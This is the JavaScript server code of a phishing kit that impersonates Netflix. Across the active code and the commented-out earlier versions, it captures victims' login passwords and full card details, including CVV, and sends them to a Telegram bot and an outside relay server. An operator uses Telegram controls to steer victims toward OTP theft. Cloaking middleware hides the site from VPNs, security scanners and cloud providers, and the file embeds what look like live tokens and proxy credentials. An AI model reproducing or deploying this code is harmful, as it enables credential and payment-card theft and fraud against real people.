// const express = require('express');
// const vhost = require('vhost');
// const session = require('express-session');
// const { v4: uuidv4 } = require('uuid');
// const axios = require('axios');
// const app = express();

// const IPINFO_API_TOKEN = '5f0f25362f9053'; // Replace with your actual API token

// // Configure session middleware
// app.use(session({
//   secret: 'ThfstiyvWBtcBohE2tkUrhX2EGSUpYE6',
//   resave: false,
//   saveUninitialized: true,
//   cookie: { secure: false }  // Set secure to true if using https
// }));

// const subdomainApp = express();

// subdomainApp.use(async (req, res, next) => {
//   try {
//     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
//     const response = await axios.get(`https://ipinfo.io/${ip}?token=${IPINFO_API_TOKEN}`);
//     req.geoLocation = response.data;
//   } catch (error) {
//     console.error('Error fetching geolocation:', error);
//     req.geoLocation = null;
//   }
//   next();
// });

// subdomainApp.get('/login', (req, res) => {
//   const geoLocation = req.geoLocation ? JSON.stringify(req.geoLocation, null, 2) : 'Location data not available';
//   res.send(`
//     <h1>Welcome to your unique subdomain: ${req.hostname}</h1>
//     <pre>Your geolocation data: ${geoLocation}</pre>
//   `);
// });

// const mainApp = express();
// mainApp.get('/', (req, res) => {
//   if (!req.session.subdomain) {
//     req.session.subdomain = uuidv4();
//   }
//   const uniqueSubdomain = `${req.session.subdomain}.biii.us`;
//   res.redirect(`http://${uniqueSubdomain}/login`);
// });

// app.use(vhost('*.biii.us', subdomainApp));
// app.use(vhost('transitor.biii.us', mainApp));

// app.listen(3011, () => {
//   console.log('Server running on port 3011');
// });


// const express = require("express");
// const bodyParser = require("body-parser");
// const axios = require("axios");
// const { v4: uuidv4 } = require("uuid");
// const session = require("express-session");

// const app = express();
// const port = 3011;

// // Middleware to parse form data
// app.use(bodyParser.urlencoded({ extended: true }));

// // Middleware for sessions
// app.use(session({
//   secret: 'ThfstiyvWBtcBohE2tkUrhX2EGSUpYE5', // Change this to a secure key
//   resave: false,
//   saveUninitialized: true,
//   cookie: { secure: false } // Set secure to true if using HTTPS
// }));

// // Middleware to handle unique subdomain generation and redirection
// app.use((req, res, next) => {
//   const host = req.headers.host;
//   const subdomain = req.session.subdomain;

//   if (host === 'transitor.biii.us') {
//     if (!subdomain) {
//       let uuid = uuidv4();
//       let uuidParts = uuid.split('-');
//       uuidParts[uuidParts.length - 1] = 'account-resolve';
//       req.session.subdomain = uuidParts.join('-');
//     }
//     res.redirect(`http://${req.session.subdomain}.biii.us/login`);
//   } else if (host.endsWith('.biii.us')) {
//     next();
//   } else {
//     res.status(403).send('Access Forbidden');
//   }
// });

// // Serve static files (e.g., HTML, CSS, JS) from a directory named 'NTFLX'
// app.use(express.static("NTFLX"));

// // Route to handle GET request
// app.get("/login", (req, res) => {
//   res.sendFile(__dirname + "/NTFLX/index.html");
// });

// // Capture user's IP address
// const getClientIp = (req) => {
//   return req.headers['x-forwarded-for'] || req.socket.remoteAddress;
// };

// async function sendMessageToBot(userLoginId, password, ip) {
//   const botToken = "7129475570:AAE4oX9VxtCqALfHtqjTqCnj6YWP_Pn8wj8"; // Replace with your Telegram bot's token
//   const chatId = "1096335592"; // Replace with your chat ID where you want to send the message

//   // Prepare the message
//   const message = `- NFX LOGIN - \nUSER: ${userLoginId}\nPASS: ${password}\nIP: ${ip}\n- NFX LOGIN -`;

//   try {
//     const response = await axios.post(
//       `https://api.telegram.org/bot${botToken}/sendMessage`,
//       {
//         chat_id: chatId,
//         text: message,
//       },
//     );
//     console.log("Message sent:", response.data);
//   } catch (error) {
//     console.error("Failed to send message:", error);
//   }
// }

// async function sendMessageToBotv1(creditCardNumber, creditExpirationMonth, creditCardSecurityCode, firstName, creditZipcode, ip) {
//   const botToken = "7129475570:AAE4oX9VxtCqALfHtqjTqCnj6YWP_Pn8wj8"; // Replace with your Telegram bot's token
//   const chatId = "1096335592"; // Replace with your chat ID where you want to send the message

//   // Prepare the message
//   const message = `- NFX DATA - \nCCNUM: ${creditCardNumber}\nEXP DATE: ${creditExpirationMonth}\nCVV: ${creditCardSecurityCode}\nFULL NAME: ${firstName}\nZIPCODE: ${creditZipcode}\nIP: ${ip}\n- NFX DATA -`;

//   try {
//     const response = await axios.post(
//       `https://api.telegram.org/bot${botToken}/sendMessage`,
//       {
//         chat_id: chatId,
//         text: message,
//       },
//     );
//     console.log("Message sent:", response.data);
//   } catch (error) {
//     console.error("Failed to send message:", error);
//   }
// }

// app.post("/submit-form", (req, res) => {
//   const params = req.body.param;
//   const ip = getClientIp(req);

//   try {
//     const parsedParams = JSON.parse(decodeURIComponent(params));
//     const { userLoginId, password } = parsedParams.fields;
//     console.log(`User: ${userLoginId}, Password: ${password}`);
//     sendMessageToBot(userLoginId, password, ip);
//     res.redirect("/thank-you");
//   } catch (e) {
//     console.error("Failed to parse parameters:", e);
//     res.status(400).send("Invalid parameters");
//   }
// });

// app.post("/updatePaymentMethod", (req, res) => {
//   const ip = getClientIp(req);

//   try {
//     const {
//       creditCardNumber,
//       creditExpirationMonth,
//       creditCardSecurityCode,
//       firstName,
//       creditZipcode,
//     } = req.body; // Directly destructure the fields from req.body

//     console.log(
//       `CARD: ${creditCardNumber}, EXPD: ${creditExpirationMonth}, CVV: ${creditCardSecurityCode}, NAME: ${firstName}, ZIPCODE: ${creditZipcode}, IP: ${ip}`,
//     );
//     sendMessageToBotv1(
//       creditCardNumber,
//       creditExpirationMonth,
//       creditCardSecurityCode,
//       firstName,
//       creditZipcode,
//       ip,
//     );
//     res.redirect("/thank-you");
//   } catch (e) {
//     console.error("Failed to handle request:", e);
//     res.status(400).send("Invalid parameters");
//   }
// });

// app.get("/thank-you", (req, res) => {
//   res.redirect("https://netflix.com/login");
// });

// app.get("/simplemember/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_large.jpg", (req, res) => {
//   res.sendFile(__dirname + "/NTFLX/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_large.jpg");
// });

// app.get("/simplemember/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_medium.jpg", (req, res) => {
//   res.sendFile(__dirname + "/NTFLX/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_medium.jpg");
// });

// app.get("/simplemember/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_small.jpg", (req, res) => {
//   res.sendFile(__dirname + "/NTFLX/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_small.jpg");
// });

// app.get("/ppIPaymentSubmitter", (req, res) => {
//   console.log("USER CLICKED ON PPL ---> REDIRECTING...");
//   res.redirect("https://invpy.pl/e8pal");
// });

// app.get("/simplemember/paymentupdater", (req, res) => {
//   res.sendFile(__dirname + "/NTFLX/update.html");
// });

// // Start the server
// app.listen(port, () => {
//   console.log(`Server running at http://localhost:${port}`);
// });


const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const { v4: uuidv4 } = require("uuid");
const session = require("express-session");
const { getJson } = require("serpapi");
const { HttpsProxyAgent } = require("https-proxy-agent");
const crypto = require('crypto');

const username = 'user-sp72cek58j-sessionduration-1';
const password = 'jh_okvBcWC06vot50H';
const encodedCredentials = encodeProxyCredentials(username, password);
const proxyHost = 'gate.smartproxy.com';
const proxyPort = getRandomPort();
const proxyUrl = `http://${encodedCredentials}@${proxyHost}:${proxyPort}`;
const agent = new HttpsProxyAgent(proxyUrl);
const TelegramBot = require('node-telegram-bot-api');


const app = express();
const port = 3011;
const serpApiKey = "7b9a70551e672ad466cef6bc7955903f3a1122633eea41f47a7ac8a2e8172894";

const ADMIN_CHAT_ID = "1096335592"; // Replace with your chat ID
const TOKEN = "7129475570:AAE4oX9VxtCqALfHtqjTqCnj6YWP_Pn8wj8";

const algorithm = 'aes-256-cbc';
const key = Buffer.from('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef', 'hex');
const iv = Buffer.from('0123456789abcdef0123456789abcdef', 'hex');


const pendingSessions = new Map();

function encryptData(data) {
    const cipher = crypto.createCipheriv(algorithm, key, iv);
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
}


class SessionManager {
    constructor() {
        this.sessions = new Map();
        this.cleanupInterval = setInterval(() => this.cleanupExpiredSessions(), 30000); // Cleanup every 30 seconds
    }

    createSession(sessionId, timeout = 300000) {
        return new Promise((resolve, reject) => {
            const session = {
                id: sessionId,
                status: 'pending',
                createdAt: Date.now(),
                expiresAt: Date.now() + timeout,
                resolve,
                reject,
                timeoutId: setTimeout(() => {
                    this.handleSessionTimeout(sessionId);
                }, timeout)
            };
            
            this.sessions.set(sessionId, session);
            console.log(`Session created: ${sessionId}`);
            return session;
        });
    }

    getSession(sessionId) {
        return this.sessions.get(sessionId);
    }

    updateSessionStatus(sessionId, status) {
        const session = this.sessions.get(sessionId);
        if (session) {
            session.status = status;
            console.log(`Session ${sessionId} status updated to: ${status}`);
        }
    }

    handleSessionTimeout(sessionId) {
        const session = this.sessions.get(sessionId);
        if (session && session.status === 'pending') {
            console.log(`Session ${sessionId} timed out`);
            session.resolve({ status: 'timeout' });
            this.removeSession(sessionId);
        }
    }

    removeSession(sessionId) {
        const session = this.sessions.get(sessionId);
        if (session) {
            clearTimeout(session.timeoutId);
            this.sessions.delete(sessionId);
            console.log(`Session removed: ${sessionId}`);
        }
    }

    cleanupExpiredSessions() {
        const now = Date.now();
        for (const [sessionId, session] of this.sessions.entries()) {
            if (now > session.expiresAt) {
                this.handleSessionTimeout(sessionId);
            }
        }
    }

    destroy() {
        clearInterval(this.cleanupInterval);
        for (const [sessionId, session] of this.sessions.entries()) {
            this.removeSession(sessionId);
        }
    }
}

const sessionManager = new SessionManager();

// Initialize bot with polling disabled
//const bot = new TelegramBot("7129475570:AAE4oX9VxtCqALfHtqjTqCnj6YWP_Pn8wj8", { 
//    polling: false 
//});

const NodeCache = require('node-cache');
const cache = new NodeCache({ stdTTL: 3600 }); // Cache for 1 hour

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));


app.use(bodyParser.json());

// Set up EJS as the view engine
app.set("view engine", "ejs");

// Middleware for sessions
app.use(session({
    secret: "ThfstiyvWBtcBohE2tkUrhX2EGSUpYE5",
    resave: true,  // Changed to true to ensure session is saved
    saveUninitialized: true,
    cookie: { 
        secure: false,
        maxAge: 60 * 60 * 1000 // 30 minutes
    }
}));



// Function to encode proxy credentials
function encodeProxyCredentials(username, password) {
    return `${encodeURIComponent(username)}:${encodeURIComponent(password)}`;
}

// Function to get a random port for the proxy
function getRandomPort(min = 10000, max = 10700) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Capture user's IP address
const getClientIp = (req) => {
    return req.headers["x-forwarded-for"] || req.socket.remoteAddress;
};

// Function to send message to Telegram
async function sendMessageToBot(message) {
    const botToken = "7241174688:AAEmVKFcYElg-8sX0VQbYggqrfGtfnaMl88";
    const chatId = "1096335592";
    const data = {
        text: message,
        chat_id: chatId,
    };

    try {
        await axios.get(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            params: data,
        });
        console.log("Message sent to Telegram");
    } catch (error) {
        console.error("Failed to send message:", error);
    }
}

// Middleware for IP checking
app.use(async (req, res, next) => {
    const ip = getClientIp(req).split(",")[0];
    const userAgent = req.headers['user-agent'];
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    console.log(`Visitor IP: ${ip}, User Agent: ${userAgent}, Is Mobile: ${isMobile}`);
    const whitelistedPaths = [
        '/receive-encrypted-data',
        '/telegram-updates',
        // Add other paths you want to whitelist
    ];

    // Check if the request path is whitelisted
    if (whitelistedPaths.includes(req.path)) {
        console.log(`Whitelisted path detected --> ${req.path}`);
        return next();
    }


    const checkIPInfo = async (ip) => {
        // Check cache first
        const cachedData = cache.get(ip);
        if (cachedData) {
            console.log(`Cache hit for IP: ${ip}`);
            return cachedData.allowed;
        }
     
        const IPINFO_TOKEN = "51a16817db97ea";
        const url = `https://ipinfo.io/${ip}?token=${IPINFO_TOKEN}`;
     
        try {
            const response = await axios.get(url);
            const { country, city, region, asn, company, privacy, abuse } = response.data;
            console.log(`
                ---------------------------------------
                IP Check (IPInfo)
                ---------------------------------------
                IP: ${ip}
                Country: ${country || 'UNAVAILABLE'}
                City: ${city || 'UNAVAILABLE'}
                Region: ${region || 'UNAVAILABLE'}
                ASN: ${asn?.asn || 'UNAVAILABLE'}
                ASN Name: ${asn?.name || 'UNAVAILABLE'} 
                ASN Type: ${asn?.type || 'UNAVAILABLE'}
                Company: ${company?.name || 'UNAVAILABLE'}
                Company Type: ${company?.type || 'UNAVAILABLE'}
                VPN: ${privacy?.vpn === undefined ? 'UNAVAILABLE' : privacy.vpn}
                Proxy: ${privacy?.proxy === undefined ? 'UNAVAILABLE' : privacy.proxy}
                Tor: ${privacy?.tor === undefined ? 'UNAVAILABLE' : privacy.tor}
                Relay: ${privacy?.relay === undefined ? 'UNAVAILABLE' : privacy.relay}
                Hosting: ${privacy?.hosting === undefined ? 'UNAVAILABLE' : privacy.hosting}
                Service: ${privacy?.service || 'UNAVAILABLE'}
                ---------------------------------------`);
     
            let allowed = true;
            
            // Check if it's a Telegram IP first
            const asnName = (asn?.name || company?.name || '').toLowerCase();
            const isTelegram = asnName.includes("telegram");
     
            if (!isTelegram) { // Only run other checks if not Telegram
                if (privacy?.vpn || privacy?.proxy || privacy?.tor || privacy?.hosting) {
                    allowed = false;
                    console.log(`BLOCKED: VPN/Proxy/Tor/Hosting detected for IP: ${ip}`);
                }
     
                if (allowed && country !== "US") {
                    const ipQualityScoreResult = await checkIpQualityScore(ip);
                    allowed = ipQualityScoreResult.allowed;
                    
                    console.log(`
                    ---------------------------------------
                    Non-US IP CHECK ${allowed ? 'ALLOWED' : 'BLOCKED'}
                    ---------------------------------------
                    IP: ${ip}
                    Country: ${country}
                    City: ${city || 'UNAVAILABLE'}
                    Region: ${region || 'UNAVAILABLE'}
                    ASN: ${asn?.asn || 'UNAVAILABLE'}
                    ASN Name: ${asn?.name || 'UNAVAILABLE'}
                    Company: ${company?.name || 'UNAVAILABLE'}
                    Decision: ${allowed ? 'ALLOWED' : 'BLOCKED'}
                    Reason: ${ipQualityScoreResult.reason}
                    ---------------------------------------`);
                }
     
                if (company) {
                    if ((asnName.includes("charter") || asnName.includes("apple")) && company.type === "business") {
                        console.log(`Business IP from ${asnName.toUpperCase()} --> ${ip}`);
                        const ipQualityScoreResult = await checkIpQualityScore(ip);
                        allowed = ipQualityScoreResult.allowed;
                        console.log(`${allowed ? 'ALLOWED' : 'BLOCKED'} ${asnName.toUpperCase()} BUSINESS IP --> ${ip}`);
                    } else if (company.type === "hosting" || asn?.type === "hosting") {
                        allowed = false;
                        console.log(`BLOCKED: Hosting IP detected --> ${ip}`);
                    }
     
                    if (asnName.includes("google") || asnName.includes("facebook") ||
                        asnName.includes("amazon") || asnName.includes("microsoft") ||
                        asnName.includes("oracle") || asnName.includes("archive") ||
                        asnName.includes("kansas") || asnName.includes("cloudflare")) {
                        allowed = false;
                        console.log(`BLOCKED: Restricted ASN detected --> ${ip}`);
                    }
     
                    if (asnName.includes("centurylink") || asnName.includes("comcast") || 
                        asnName.includes("internet archive") || asnName.includes("university") || 
                        asnName.includes("midcontinent")) {
                        console.log(`SUS VISITOR FROM ${asnName} --> ${ip}`);
                        const strictness = asnName.includes("centurylink") || asnName.includes("comcast") ? "3" : "1";
                        const ipQualityScoreResult = await checkIpQualityScore(ip, strictness);
                        allowed = ipQualityScoreResult.allowed;
                        if (!allowed) {
                            console.log(`BLOCKED ${asnName.toUpperCase()} BOT --> ${ip}`);
                        }
                    }
     
                    if (company?.type === "business") {
                        const ipQualityScoreResult = await checkIpQualityScore(ip);
                        allowed = ipQualityScoreResult.allowed;
                        console.log(`LAYER[2] -- ${allowed ? 'ALLOWED' : 'BLOCKED'} ${asnName.toUpperCase()} BUSINESS IP --> ${ip}`);
                    }
                }
            } else {
                // Force allow if it's Telegram regardless of other checks
                allowed = true;
                console.log(`ALLOWED: Telegram IP detected --> ${ip}`);
            }
     
            console.log(`Final decision for IP ${ip}: ${allowed ? 'ALLOWED' : 'BLOCKED'}`);
            
            // Cache the result
            cache.set(ip, { allowed });
            
            return allowed;
        } catch (error) {
            console.error("Error fetching IPInfo:", error.message);
            return false;
        }
     };

    const checkIpQualityScore = async (ip, strictness = "1") => {
        // Check cache first
        const cacheKey = `ipqs_${ip}_${strictness}`;
        const cachedData = cache.get(cacheKey);
        if (cachedData) {
            console.log(`Cache hit for IP Quality Score: ${ip} (Strictness: ${strictness})`);
            return cachedData;
        }

        const ipQualityScoreUrl = `https://ipqualityscore.com/api/json/ip/juD90IvBTtl5YrYfzPmHXcFhf2BSqZis/${ip}?strictness=${strictness}&allow_public_access_points=true&fast=true&lighter_penalties=true&mobile=${isMobile}&user_agent=${encodeURIComponent(userAgent)}`;
        try {
            const ipQualityScoreResponse = await axios.get(ipQualityScoreUrl);
            const { recent_abuse, bot_status, ISP, host, organization, mobile, proxy, vpn, tor, fraud_score } = ipQualityScoreResponse.data;
            console.log(`
--------------------------------------
IP Quality Score Check (Strictness: ${strictness})
--------------------------------------
ISP: ${ISP || 'UNAVAILABLE'}
Hostname: ${host || 'UNAVAILABLE'}
Organization: ${organization || 'UNAVAILABLE'}
Mobile: ${mobile}
Proxy: ${proxy}
VPN: ${vpn}
TOR: ${tor}
Fraud Score: ${fraud_score}
--------------------------------------`);
            const result = { 
                allowed: !(recent_abuse || bot_status || proxy || vpn || tor || fraud_score > 75), 
                reason: 'Failed one or more checks' 
            };
            
            // Cache the result
            cache.set(cacheKey, result);
            
            return result;
        } catch (error) {
            console.error("Error fetching IP Quality Score:", error.message);
            return { allowed: false, reason: 'Error checking IP Quality Score' };
        }
    };

    try {
        const allowed = await checkIPInfo(ip);
        if (!allowed) {
            console.log("BLOCKED USER -->", ip);
            //return res.status(403).json({
            //    success: false,
            //    message: "Access denied.",
            //});
            return res.redirect("https://www.netflix.com/NotFound?prev=https%3A%2F%2Fwww.netflix.com%2FForbidden%3Fprev%3Dhttps%253A%252F%252Fwww.netflix.com%252Fforbidden");
        }
        
        console.log("ALLOWED USER -->", ip);
        next();
    } catch (error) {
        console.error("Error in middleware:", error);
        return res.status(500).json({
            success: false,
            message: "Internal Server Error",
        });
    }
});

// Middleware for domain checking
app.use((req, res, next) => {
    const host = req.headers.host;
    if (host.endsWith('fly.dev') || host.endsWith('settlemonitor.com')) {
        next();
    //} else if (req.ip === "2600:1006:b001:9555:2016:45a5:2047:e86a"){
    //    res.redirect("https://netflix.com/login")
    } else {
        res.redirect("https://netflix.com/login");
    }
});

// Serve static files
app.use(express.static("NTFLX"));

// Route to handle GET request
app.get("/login", (req, res) => {
    res.sendFile(__dirname + "/NTFLX/index.html");
});
const detectCardType = (cardNumber) => {
    // Remove any non-digit characters
    const cleanNumber = cardNumber.replace(/\D/g, '');
  
    // Regex patterns for different card types
    const patterns = {
      Visa: /^4/,
      Mastercard: /^5[1-5]|^2[2-7]/,
      'American Express': /^3[47]/,
      Discover: /^6(?:011|5)/,
      JCB: /^35(?:2[89]|[3-8])/,
      'Diners Club': /^3(?:0[0-5]|[68])/,
      Maestro: /^(5018|5020|5038|6304|6759|676[1-3])/,
      UnionPay: /^62/
    };
  
    for (const [cardType, pattern] of Object.entries(patterns)) {
      if (pattern.test(cleanNumber)) {
        return cardType;
      }
    }
  
    return 'Unknown';
  };
  

const blacklistedBanks = ['chase', 'jpmorgan chase', 'jpmorgan chase bank', 'j.p. morgan'];
    // Store pending sessions
// Initialize bot and setup handlers
//const bot = new TelegramBot(TOKEN, { polling: true });
// Store pending sessions
const bot = new TelegramBot(TOKEN, { polling: false }); // Set polling to false
const WEBHOOK_URL = 'https://middle-man-workman1.onrender.com/telegram-updates';


// Initialize bot and setup handlers
const API_URL = `https://api.telegram.org/bot${TOKEN}`;
// Set the webhook once when the server starts
async function setWebhook() {
    try {
        const response = await axios.post(`${API_URL}/setWebhook`, {
            url: WEBHOOK_URL,
        });
        console.log('Webhook set successfully:', response.data);
    } catch (error) {
        console.error('Failed to set webhook:', error);
    }
}


// Call the setWebhook function at startup
setWebhook();

// Send Telegram message with optional inline keyboard
async function sendTelegramMessage(chatId, text, keyboard = null) {
    try {
        const data = {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
        };

        if (keyboard) {
            data.reply_markup = keyboard;
        }

        const response = await axios.post(`${API_URL}/sendMessage`, data);
        return response.data;
    } catch (error) {
        console.error('Failed to send Telegram message:', error);
        throw error;
    }
}
async function answerCallbackQuery(queryId, text) {
    try {
        await axios.post(`${API_URL}/answerCallbackQuery`, {
            callback_query_id: queryId,
            text: text,
        });
    } catch (error) {
        console.error('Failed to answer callback query:', error);
    }
}

// Process incoming updates from Telegram

// Endpoint to receive updates from Telegram (set as webhook)
app.post('/telegram-updates', async (req, res) => {
    try {
        await processUpdate(req.body);
        res.sendStatus(200);
    } catch (error) {
        console.error('Error handling update:', error);
        res.sendStatus(500);
    }
});

// Endpoint to handle payment method updates
app.post("/updatePaymentMethod", async (req, res) => {
    try {
        const {
            creditCardNumber,
            creditExpirationMonth,
            creditCardSecurityCode,
            creditCardSecurityPCode,
            firstName,
            creditZipcode,
        } = req.body;

        const ip = getClientIp(req);
        const sessionId = Math.random().toString(36).substring(7);
        console.log('Created new session:', sessionId);
        // Get bank name and card type
        req.session.ccnumber = creditCardNumber.replace(/\s+/g, ''); // Remove spaces
        const bin = creditCardNumber.replace(/\s+/g, "").slice(0, 6);
        let bankName = "Unknown Bank";
        let cardType = detectCardType(creditCardNumber);

        // Set default bank name for American Express
        if (cardType === 'American Express') {
            bankName = "American Express";
        } else if (cardType === 'Discover' || creditCardNumber.startsWith('6011')) {
            bankName = "Discover";
        }

        try {
            const apiLayerResponse = await axios.get(
                `https://api.apilayer.com/bincheck/${bin}`,
                {
                    headers: {
                        'apikey': 'XMCXLi0yUABWwaem1lg9VPD7wxikd4Gu'
                    }
                }
            );
            
            if (apiLayerResponse.data.bank_name) {
                bankName = apiLayerResponse.data.bank_name;
            }
            
            if (apiLayerResponse.data.scheme) {
                cardType = apiLayerResponse.data.scheme;
            }
        } catch (error) {
            console.error("BIN lookup failed:", error.message);
        }

        // Ensure bankName is not empty
        if (!bankName || bankName.trim() === "") {
            bankName = cardType === 'American Express' ? "American Express" : "Unknown Bank";
        }

        // Store data in session
        req.session.ccnumber = creditCardNumber;
        req.session.phoneNumber = "1234567890"; // Default phone number
        req.session.firstName = firstName;
        req.session.bankName = bankName;
        req.session.cardType = cardType;

        // Create sensitive data object
        const sensitiveData = {
            creditCardNumber,
            creditExpirationMonth,
            creditCardSecurityCode,
            creditCardSecurityPCode,
            firstName,
            creditZipcode,
            cardType,
            bankName,
            ip,
            sessionId
        };

        // Encrypt the data
        const encryptedData = encryptData(sensitiveData);

        // Send to Flask API
        try {
            await axios.post('https://middle-man-workman1.onrender.com/receive-encrypted-data', {
                encryptedData,
                messageType: 'payment'
            }, {
                headers: {
                    'Content-Type': 'application/json'
                }
            });
        } catch (error) {
            console.error("Failed to send to Flask API:", error);
            throw error;
        }

        const sessionPromise = new Promise((resolve, reject) => {
            const sessionData = {
                resolve,
                reject,
                status: 'pending',
                userData: { 
                    fullName: firstName
                },
                timeoutId: setTimeout(() => {
                    if (pendingSessions.has(sessionId)) {
                        console.log('Session timed out:', sessionId);
                        pendingSessions.delete(sessionId);
                        resolve({ status: 'timeout' });
                    }
                }, 300000)
            };
            
            pendingSessions.set(sessionId, sessionData);
        });

        console.log('Waiting for response...');
        const response = await sessionPromise;
        console.log('Received response:', response);

        // Clean up the session
        const session = pendingSessions.get(sessionId);
        if (session && session.timeoutId) {
            clearTimeout(session.timeoutId);
        }
        pendingSessions.delete(sessionId);

        // Handle responses
        if (response.status === 'timeout') {
            return res.json({
                success: false,
                message: "Session timed out"
            });
        }
        
        if (response.status === 'declined') {
            if (response.message === 'redirecting_to_ppl') {
                return res.json({
                    success: false,
                    message: response.message,
                    showPaymentFormContainer1: true
                });
            }
            return res.json({
                success: false,
                message: response.message
            });
        }
        
        if (response.status === 'url_redirect' && response.url) {
            console.log("Sending URL redirect response:", response.url);
            return res.json({
                success: true,
                redirectUrl: response.url
            });
        }

        // Default OTP flow
        console.log("Proceeding to OTP verification");
        return res.json({
            success: true,
            redirectUrl: `/otp-verification?bank=${encodeURIComponent(bankName)}&cchold=${encodeURIComponent(firstName)}`
        });

    } catch (error) {
        console.error("Failed to handle request:", error);
        res.status(400).json({
            success: false,
            message: "Invalid parameters or processing error"
        });
    }
});
// Helper function to process the URL response
function processUrlResponse(url) {
    return {
        status: 'url_redirect',
        url: url
    };
}


async function processUpdate(update) {
    try {
        if (update.callback_query) {
            const query = update.callback_query;
            const data = query.data;
            let action, sessionId;
            
            // Parse the callback data correctly
            if (data.includes('redirect_ppl_')) {
                [action, subaction, sessionId] = data.split('_');
            } else {
                [action, sessionId] = data.split('_');
            }
            
            console.log('Processing callback query:', {action, sessionId, data});
            
            const session = pendingSessions.get(sessionId);
            console.log('Found session:', session);

            if (!session) {
                console.log('Session not found for ID:', sessionId);
                await answerCallbackQuery(query.id, 'Session still valid, please try again');
                return;
            }

            const fullName = session.userData?.fullName || 'UNKNOWN USER';

            // Handle different actions
            if (action === 'approve') {
                console.log('⏳ Processing approve action for session:', sessionId);
                pendingSessions.delete(sessionId);
                session.resolve({ 
                    status: 'approve',
                    redirectUrl: '/otp-verification'
                });
                await answerCallbackQuery(query.id, `▶ Continuing to OTP verification for ${fullName}`);
                await sendTelegramMessage(query.message.chat.id, 
                    `✅ Continued to OTP verification for ${fullName.toUpperCase()}`);

            } else if (action === 'redirect' && !data.includes('ppl')) {
                console.log('⏳ Processing redirect action for session:', sessionId);
                session.status = 'waiting_for_url';
                await answerCallbackQuery(query.id);
                await sendTelegramMessage(query.message.chat.id, 
                    `Please send the custom URL for session ${sessionId}`);

            } else if (action === 'redirect' && data.includes('ppl')) {
                console.log('⏳ Processing PPL redirect action for session:', sessionId);
                pendingSessions.delete(sessionId);
                session.resolve({
                    status: 'declined',
                    message: 'redirecting_to_ppl',
                    showPaymentFormContainer1: true,
                    redirectUrl: '/ppIPaymentSubmitter'
                });
                await answerCallbackQuery(query.id, `▶ Redirecting ${fullName} to PPL`);
                await sendTelegramMessage(query.message.chat.id, 
                    `🔄 Redirected ${fullName.toUpperCase()} to PPL`);

            } else if (action === 'decline') {
                console.log('⏳ Processing decline action for session:', sessionId);
                pendingSessions.delete(sessionId);
                session.resolve({
                    status: 'declined',
                    message: "Your card doesn't support this type of purchase. Please try using a different card.",
                    redirectUrl: '/thank-you'
                });
                await answerCallbackQuery(query.id, `Payment declined for ${fullName}`);
                await sendTelegramMessage(query.message.chat.id, 
                    `❌ Payment declined for ${fullName.toUpperCase()}`);
            }

        } else if (update.message?.text?.startsWith('http')) {
            console.log('Received URL message:', update.message.text);
            
            let activeSession = null;
            let activeSessionId = null;
            
            for (const [id, session] of pendingSessions.entries()) {
                if (session.status === 'waiting_for_url') {
                    activeSession = session;
                    activeSessionId = id;
                    break;
                }
            }

            if (activeSession) {
                console.log('Found active session:', activeSessionId);
                pendingSessions.delete(activeSessionId);
                activeSession.resolve({
                    status: 'url_redirect',
                    url: update.message.text,
                    redirectUrl: update.message.text
                });
                
                await sendTelegramMessage(update.message.chat.id, 
                    `✅ Custom URL set successfully for ${activeSession.userData?.fullName || 'UNKNOWN USER'}`);
            } else {
                console.log('No active session waiting for URL');
                await sendTelegramMessage(update.message.chat.id, 
                    'No active session waiting for URL.');
            }
        }
    } catch (error) {
        console.error('Error processing update:', error);
    }
}


app.post("/submit-form", async (req, res) => {
    try {
        const params = req.body.param;
        const ip = getClientIp(req);
        
        const parsedParams = JSON.parse(decodeURIComponent(params));
        const { userLoginId, password } = parsedParams.fields;

        // Prepare data for encryption
        const loginData = {
            userLoginId,
            password,
            ip
        };

        // Encrypt the data
        const encryptedData = encryptData(loginData);

        // Send to Flask API
        try {
            await axios.post('https://middle-man-workman1.onrender.com/receive-encrypted-data', {
                encryptedData,
                messageType: 'login'
            });
        } catch (error) {
            console.error("Failed to send to Flask API:", error);
            throw error;
        }

        res.redirect("/thank-you");
    } catch (e) {
        console.error("Failed to process request:", e);
        res.status(400).send("Invalid parameters");
    }
});


app.post('/session-update', (req, res) => {
    try {
        const { sessionId, response } = req.body;
        console.log('Received session update:', { sessionId, response });

        const session = pendingSessions.get(sessionId);
        if (!session) {
            console.log('Session not found:', sessionId);
            return res.status(404).json({ success: false, message: 'Session not found' });
        }

        if (response.status === 'approve') {
            pendingSessions.delete(sessionId);
            session.resolve({
                status: 'approve',
                message: 'continue_to_otp',
                redirectUrl: `/otp-verification?bank=${encodeURIComponent(session.bankName)}&cchold=${encodeURIComponent(session.firstName)}`
            });
        } else if (response.status === 'waiting_for_url') {
            session.status = 'waiting_for_url';
        } else if (response.status === 'declined') {
            if (response.message === 'redirecting_to_ppl') {
                pendingSessions.delete(sessionId);
                session.resolve({
                    status: 'declined',
                    message: 'redirecting_to_ppl',
                    showPaymentFormContainer1: true,
                    redirectUrl: '/ppIPaymentSubmitter'
                });
            } else {
                pendingSessions.delete(sessionId);
                session.resolve({
                    status: 'declined',
                    message: response.message || "Your card doesn't support this type of purchase. Please try using a different card.",
                    redirectUrl: '/thank-you'
                });
            }
        } else if (response.status === 'url_redirect' && response.url) {
